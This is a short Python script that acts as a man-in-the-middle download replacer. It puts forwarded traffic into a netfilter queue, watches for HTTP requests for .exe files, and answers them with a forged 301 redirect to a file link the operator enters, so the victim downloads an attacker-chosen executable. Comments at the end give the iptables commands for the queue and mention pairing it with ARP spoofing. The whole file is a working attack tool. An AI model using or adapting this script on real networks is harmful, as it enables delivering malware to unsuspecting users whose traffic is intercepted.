#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
import subprocess

ack_list = []


def set_load(packet, load):
    print("[+] Replacing download file...")
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:  # http means 80
            if ".exe" in scapy_packet[scapy.Raw].load:
                print("[+] exe Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: " + website + "\n\n")
                packet.set_payload(str(modified_packet))
    packet.accept()


website = raw_input("Enter the link of file: ")
subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)
try:
    print("[+] Replace download started on " + website)
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    print("[+] Resetting DNS tables")
    subprocess.call("iptables --flush", shell=True)

# iptables -I FORWARD -j NFQUEUE --queue-num 0      //Create a queue with arp spoof
# iptables -I INPUT -j NFQUEUE --queue-num 0      //Create a queue for own pc input packet
# iptables -I OUTPUT -j NFQUEUE --queue-num 0      //Create a queue for own pc output packet
# iptables --flush      //To delete the queue
